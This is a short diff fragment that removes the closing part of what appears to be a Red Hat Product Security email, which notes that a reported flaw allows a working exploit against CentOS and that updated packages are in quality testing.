-results in a working exploit, with all the mitigation in centos being
-bypassed." from zhenpeng
-
-Updated packages for Red Hat are currently in QE and will be released when
-available.
-
-Regards,
-..
-Rohit Keshri / Red Hat Product Security Team
-PGP: OX01BC 858A 07B7 15C8 EF33 BFE2 2EEB 0CBC 84A4 4C2D
-
-secalert@redhat.com for urgent response
-
---000000000000389a3005cb63b667--
-
+--------------94B1C527BAF74BFA672B3E78--
